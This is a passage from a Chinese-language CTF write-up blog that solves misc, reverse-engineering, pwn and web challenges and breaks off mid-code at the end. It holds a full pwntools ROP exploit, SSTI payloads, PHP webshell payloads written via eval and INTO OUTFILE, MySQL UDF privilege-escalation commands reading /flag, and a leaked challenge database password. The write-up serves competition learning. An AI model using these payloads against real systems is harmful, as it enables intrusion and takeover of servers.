<code>Audacity</code>查看音频，选择 <code>音高</code> ，发现音频只有上下两种状态，且间隔比较固定，猜测是二进制。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/m_3_1.png"></p><p>根据上为1，下为0，以第一个下的宽度为固定间隔，把音频转成1和0。（手动转换）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01100110001101101000011011100110110111100100011010100110110011000000111011111010010001101111011000001100000011101111101001000110110011001010011000001110101111100101000011</span><br></pre></td></tr></table></figure><p>最后把二进制转成字符即可得到flag。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/m_3_2.png"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="xor"><a href="#xor" class="headerlink" title="xor++"></a>xor++</h2><p>分析：</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/r_1_1.png"></p><p>就一个异或，每次异或后v8++</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> v4[<span class="number">37</span>]=<span class="string">&quot;%($!&lt;*&lt;&quot;</span>;</span><br><span class="line">v4[<span class="number">7</span>] = <span class="number">30</span>;</span><br><span class="line">v4[<span class="number">8</span>] = <span class="number">20</span>;</span><br><span class="line">v4[<span class="number">9</span>] = <span class="number">40</span>;</span><br><span class="line">v4[<span class="number">10</span>] = <span class="number">36</span>;</span><br><span class="line">v4[<span class="number">11</span>] = <span class="number">40</span>;</span><br><span class="line">v4[<span class="number">12</span>] = <span class="number">41</span>;</span><br><span class="line">v4[<span class="number">13</span>] = <span class="number">97</span>;</span><br><span class="line">v4[<span class="number">14</span>] = <span class="number">50</span>;</span><br><span class="line">v4[<span class="number">15</span>] = <span class="number">39</span>;</span><br><span class="line">v4[<span class="number">16</span>] = <span class="number">63</span>;</span><br><span class="line">v4[<span class="number">17</span>] = <span class="number">32</span>;</span><br><span class="line">v4[<span class="number">18</span>] = <span class="number">12</span>;</span><br><span class="line">v4[<span class="number">19</span>] = <span class="number">9</span>;</span><br><span class="line">v4[<span class="number">20</span>] = <span class="number">32</span>;</span><br><span class="line">v4[<span class="number">21</span>] = <span class="number">104</span>;</span><br><span class="line">v4[<span class="number">22</span>] = <span class="number">55</span>;</span><br><span class="line">v4[<span class="number">23</span>] = <span class="number">46</span>;</span><br><span class="line">v4[<span class="number">24</span>] = <span class="number">4</span>;</span><br><span class="line">v4[<span class="number">25</span>] = <span class="number">63</span>;</span><br><span class="line">v4[<span class="number">26</span>] = <span class="number">53</span>;</span><br><span class="line">v4[<span class="number">27</span>] = <span class="number">106</span>;</span><br><span class="line">v4[<span class="number">28</span>] = <span class="number">17</span>;</span><br><span class="line">v4[<span class="number">29</span>] = <span class="number">7</span>;</span><br><span class="line">v4[<span class="number">30</span>] = <span class="number">4</span>;</span><br><span class="line">v4[<span class="number">31</span>] = <span class="number">61</span>;</span><br><span class="line">v4[<span class="number">32</span>] = <span class="number">14</span>;</span><br><span class="line">v4[<span class="number">33</span>] = <span class="number">17</span>;</span><br><span class="line">v4[<span class="number">34</span>] = <span class="number">38</span>;</span><br><span class="line">v4[<span class="number">35</span>] = <span class="number">14</span>;</span><br><span class="line">v4[<span class="number">36</span>] = <span class="number">26</span>;</span><br><span class="line"><span class="type">int</span> v8 = <span class="number">67</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0x24</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>((v8^v4[i]));</span><br><span class="line">v8++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;buT_diff1cultY_w0nt_ch4Nge_muCh&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h2><p>ida硬找（</p><p>发现这里实现了一个rc4加密，猜测这里能出flag。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/r_2_1.png"></p><p>把key和密文扒下来，解密即可得到flag。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *v10,<span class="type">unsigned</span> <span class="type">char</span> *byte_7FF72ABB1410)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> v9 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">v9 = (byte_7FF72ABB1410[j % <span class="number">0x20</span>] + v10[j] + v9) % <span class="number">256</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = v10[j];</span><br><span class="line">v10[j] = v10[v9];</span><br><span class="line">v10[v9] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> v10[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">    v10[i] = i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF72ABB1410[<span class="number">32</span>] = &#123;<span class="number">136</span>, <span class="number">227</span>, <span class="number">238</span>,  <span class="number">17</span>, <span class="number">198</span>,  <span class="number">73</span>, <span class="number">116</span>, <span class="number">165</span>, <span class="number">221</span>, <span class="number">152</span>, </span><br><span class="line">   <span class="number">89</span>, <span class="number">233</span>,  <span class="number">72</span>, <span class="number">247</span>, <span class="number">110</span>, <span class="number">191</span>,  <span class="number">58</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">223</span>, </span><br><span class="line">   <span class="number">16</span>,  <span class="number">66</span>, <span class="number">255</span>, <span class="number">153</span>, <span class="number">108</span>, <span class="number">227</span>,  <span class="number">62</span>,   <span class="number">5</span>,  <span class="number">44</span>, <span class="number">101</span>, </span><br><span class="line">   <span class="number">71</span>, <span class="number">239</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF72ABB1430[<span class="number">26</span>]=&#123;<span class="number">2</span>, <span class="number">204</span>,  <span class="number">71</span>, <span class="number">179</span>,  <span class="number">77</span>, <span class="number">108</span>, <span class="number">253</span>, <span class="number">154</span>,  <span class="number">76</span>,  <span class="number">78</span>, </span><br><span class="line">  <span class="number">212</span>, <span class="number">139</span>,  <span class="number">30</span>, <span class="number">129</span>,  <span class="number">25</span>,  <span class="number">10</span>,  <span class="number">52</span>,  <span class="number">38</span>, <span class="number">208</span>, <span class="number">255</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">182</span>, <span class="number">176</span>, <span class="number">146</span>,  <span class="number">73</span>, <span class="number">179</span>&#125;;</span><br><span class="line"><span class="built_in">init</span>(v10,byte_7FF72ABB1410);</span><br><span class="line"><span class="type">int</span> v6=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v8=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">v8 = ((<span class="type">unsigned</span> __int8)v10[v6] + v8) % <span class="number">256</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = v10[v6];</span><br><span class="line">v10[v6] = v10[v8];</span><br><span class="line">v10[v8] = tmp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> out = (<span class="type">unsigned</span> __int8)v10[((<span class="type">unsigned</span> __int8)v10[v8] + (<span class="type">unsigned</span> __int8)v10[v6]) % <span class="number">256</span>] ^ byte_7FF72ABB1430[k];</span><br><span class="line">cout &lt;&lt; out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;ho00OoOoOoked_gotcha&#125;</span></span><br></pre></td></tr></table></figure><h2 id="睡-Lite"><a href="#睡-Lite" class="headerlink" title="睡_Lite"></a>睡_Lite</h2><p>文件名是 <code>sleep_lite.ino.with_bootloader.standard.hex</code> ，了解了一下是固件的hex文件。</p><p>ida分析，模式全都试一遍，直到能看到函数反编译出来。</p><p>选择 <code>AVR</code> 模式，能看到有函数反编译出来了。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/r_3_1.png"></p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/r_3_2.png"></p><p>稍微看一下，<code>F5</code> 不能用，但可以发现<code>sub_48</code>被多次调用，结合题意，猜测这是<code>sleep</code>函数。</p><p>接着就找 <code>call</code> 之前的操作，发现了字符。</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/r_3_3.png"></p><p>把这些字符收集起来，即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;dEl4y_n0_MoR3&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="摩登Pwn"><a href="#摩登Pwn" class="headerlink" title="摩登Pwn"></a>摩登Pwn</h2><p>分析</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/p_1_2.png"></p><p>发送一个<code>0x80000000</code>即可达成条件，需要转成10进制</p><p><img src="/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/p_1_1.png"></p><h2 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h2><p>栈迁移，前面有很大一串内存地址可以存放rop链，通过第一个输入点可以带出old_rbp，相当于可以通过计算偏移知道我们写入的rop链在栈上的那个位置，这样就不用去爆破了。开了沙箱，orw读flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">ip_port = [<span class="string">&#x27;competition.blue-whale.me&#x27;</span>, <span class="number">20896</span>]</span><br><span class="line">pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libcfile = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">libc = ELF(libcfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loginfo</span>(<span class="params">a, b=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> b <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        log.info(a)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.info(a + <span class="built_in">hex</span>(b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;p&#x27;</span> <span class="keyword">in</span> sys.argv[<span class="number">1</span>]:</span><br><span class="line">        p = process(pwnfile)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;r&#x27;</span> <span class="keyword">in</span> sys.argv[<span class="number">1</span>]:</span><br><span class="line">        p = remote(ip_port[<span class="number">0</span>], ip_port[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    loginfo(<span class="string">&quot;INVALID_PARAMETER&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv64_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">content=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p, content)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># debug(&#x27;b *0x400AE0&#x27;)</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x140</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, payload)</span><br><span class="line">    rbp_addr = recv64_addr()</span><br><span class="line">    loginfo(<span class="string">&#x27;rbp_addr: &#x27;</span>, rbp_addr)</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0x400b93</span></span><br><span class="line">    ret = <span class="number">0x400B29</span></span><br><span class="line">    read_got = <span class="number">0x601050</span></span><br><span class="line">    puts_plt = <span class="number">0x4007E0</span></span><br><span class="line">    leave_ret = <span class="number">0x400B09</span></span><br><span class="line">    func = <span class="number">0x400A76</span></span><br><span class="line"></span><br><span class="line">    rop = p64(ret)*<span class="number">10</span> + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(<span class="number">0x400A76</span>)</span><br><span class="line">    payload = rop.ljust(<span class="number">0x140</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(rbp_addr-<span class="number">0x150</span>)</span><br><span class="line">    payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;again:&#x27;</span>, payload)</span><br><span class="line">    puts_addr = recv64_addr()</span><br><span class="line"></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    loginfo(<span class="string">&#x27;libc_base: &#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">    pop_rsi_ret = libc_base + <span class="number">0x202f8</span></span><br><span class="line">    pop_rdx_ret = libc_base + <span class="number">0x1b92</span></span><br><span class="line">    open_addr = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read_addr = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    flag = rbp_addr - <span class="number">0x1B0</span></span><br><span class="line"></span><br><span class="line">    orw = p64(pop_rdi_ret) + p64(flag) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(rbp_addr - <span class="number">0x1A0</span>) + p64(read_addr)</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(rbp_addr - <span class="number">0x1A0</span>) + p64(puts_plt)</span><br><span class="line">    orw += p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload = orw.ljust(<span class="number">0x140</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(rbp_addr-<span class="number">0x230</span>)</span><br><span class="line">    payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;again:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> REVERSE </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HZNUCTF</title>
      <link href="/HZNUCTF/"/>
      <url>/HZNUCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezssti"><a href="#ezssti" class="headerlink" title="ezssti"></a>ezssti</h2><p>go的ssti，源码里面定义了一个恶意函数，可以用来rce。</p><p>源码;</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;text/template&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">Id     <span class="type">int</span></span><br><span class="line">Name   <span class="type">string</span></span><br><span class="line">Passwd <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u User)</span></span> Eval(command <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">out, _ := exec.Command(command).CombinedOutput()</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">r.ParseForm()</span><br><span class="line">username := strings.Join(r.PostForm[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;&quot;</span>)</span><br><span class="line">password := strings.Join(r.PostForm[<span class="string">&quot;passwd&quot;</span>], <span class="string">&quot;&quot;</span>)</span><br><span class="line">user := &amp;User&#123;<span class="number">1</span>, username, password&#125;</span><br><span class="line">tpl1 := fmt.Sprintf(<span class="string">`&lt;h1&gt;Hi, `</span> + username + <span class="string">`&lt;/h1&gt; This is SSTI, please post your name and password`</span>)</span><br><span class="line">html, err := template.New(<span class="string">&quot;login&quot;</span>).Parse(tpl1)</span><br><span class="line">html = template.Must(html, err)</span><br><span class="line">html.Execute(w, user)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr: <span class="string">&quot;0.0.0.0:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Print(<span class="string">&quot;Server is running on 0.0.0.0:8080&quot;</span>)</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/login&quot;</span>, Login)</span><br><span class="line">server.ListenAndServe()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看env即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;.Eval &quot;env&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./HZNUCTF/w_1_1.png"></p><h2 id="suid"><a href="#suid" class="headerlink" title="suid"></a>suid</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// var_dump($_POST);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;s_1.1&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;level 1&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;success!&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nonono 1&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无参数rce，getallheader和next没被过滤，可以写个转接rce。</p><p>我这里是重新写了个webshell方便后续操作。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Header:</span><br><span class="line">a: system(&quot;echo PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4=|base64 -d &gt; shell.php&quot;);</span><br><span class="line"></span><br><span class="line">POSt:</span><br><span class="line">s[1.1=1&amp;cmd=eval(next(getallheaders()));</span><br></pre></td></tr></table></figure><p><img src="/./HZNUCTF/w_2_1.png"></p><p>最后反弹shell提权，发现bash有suid权限，提权成功后即可查看flag。</p><p><img src="/./HZNUCTF/w_2_2.png"></p><h2 id="sql2login"><a href="#sql2login" class="headerlink" title="sql2login"></a>sql2login</h2><p>注册登录就能得到flag了。</p><h2 id="真亦假，假亦真-HZNU版"><a href="#真亦假，假亦真-HZNU版" class="headerlink" title="真亦假，假亦真(HZNU版)"></a>真亦假，假亦真(HZNU版)</h2><p>一句话木马，蚁剑连接即可在根目录下查看到flag。</p><p><img src="/./HZNUCTF/w_3_1.png"></p><p><img src="/./HZNUCTF/w_3_2.png"></p><h2 id="炼狱waf-S"><a href="#炼狱waf-S" class="headerlink" title="炼狱waf-S"></a>炼狱waf-S</h2><p>过滤看着很多，但存在非预期。</p><p>过滤了 <code>&#39;&#39;</code>和拼接符号，但可以用多个空格插在中间绕过<code>&#39;&#39;</code>的过滤。</p><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=&#123;&#123;().__class__.__bases__[0].__subclasses__()[133][&#x27;__in&#x27; &#x27;it__&#x27;][&#x27;__glo&#x27; &#x27;bals__&#x27;][&#x27;po&#x27; &#x27;pen&#x27;](&#x27;en&#x27; &#x27;v&#x27;)[&#x27;re&#x27; &#x27;ad&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/./HZNUCTF/w_4_1.png"></p><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>先是彩票，伪随机，只要再同一时间内生成的彩票号码是一样的，写个脚本发包即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://150.158.117.224:20095/r4Mkl&quot;</span></span><br><span class="line"></span><br><span class="line">txt = requests.post(url,data=&#123;<span class="string">&quot;number&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;).text</span><br><span class="line"></span><br><span class="line">go = txt.split(<span class="string">&quot;中奖号码为: &quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(go)</span><br><span class="line">txt2 = requests.post(url,data=&#123;<span class="string">&quot;number&quot;</span>:go&#125;).text</span><br><span class="line"><span class="built_in">print</span>(txt2)</span><br></pre></td></tr></table></figure><p>接着是整型溢出，多试几次就行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tax=25536</span><br></pre></td></tr></table></figure><p><img src="/./HZNUCTF/w_5_1.png"></p><p>最后是CVE复现，复现出来即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filepath=http://root:P@ssw0rd!@[127.0.0.1][&#x27;Pwned!&#x27;]:</span><br></pre></td></tr></table></figure><p><img src="/./HZNUCTF/w_5_2.png"></p><h2 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h2><p>Mysql任意文件读取。</p><p>先在自己的服务器上起一个fake_mysql，然后连接，即可读到flag。</p><p><img src="/./HZNUCTF/w_6_1.png"></p><h2 id="HardSql"><a href="#HardSql" class="headerlink" title="HardSql"></a>HardSql</h2><p>同样先读文件，这次读的是query.php，拿到mysql的账户密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root：asd222!!@332asc</span><br></pre></td></tr></table></figure><p><img src="/./HZNUCTF/w_7_2.png"></p><p>用这个账户密码登录数据库，接着写入一句话木马。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;</span><br></pre></td></tr></table></figure><p>接着是udf提权。</p><p>参考链接：<a href="https://www.cnblogs.com/sfsec/p/15241860.html">MySQL提权总结</a></p><p>先把<code>udf.so</code>放到 <code>/usr/lib/mariadb/plugin/</code>目录下，然后依次执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br></pre></td></tr></table></figure><p>之后就可以执行系统命令读flag了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql=select sys_eval(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/./HZNUCTF/w_7_1.png"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>ida的常用技巧</p><p>flag1:</p><p><img src="/./HZNUCTF/r_1_1.png"></p><p>flag2:</p><p><img src="/./HZNUCTF/r_1_2.png"></p><p>flag3:</p><p><img src="/./HZNUCTF/r_1_3.png"></p><p>flag4:</p><p><img src="/./HZNUCTF/r_1_4.png"></p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>反编译查看，前半段做了异或，后半段是base64</p><p><img src="/./HZNUCTF/r_2_1.png"></p><p>flag1:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v15[<span class="number">16</span>]=&#123;<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;k&#x27;</span>&#125;;</span><br><span class="line">v15[<span class="number">2</span>] = <span class="number">127</span>;</span><br><span class="line">v15[<span class="number">3</span>] = <span class="number">100</span>;</span><br><span class="line">v15[<span class="number">4</span>] = <span class="number">114</span>;</span><br><span class="line">v15[<span 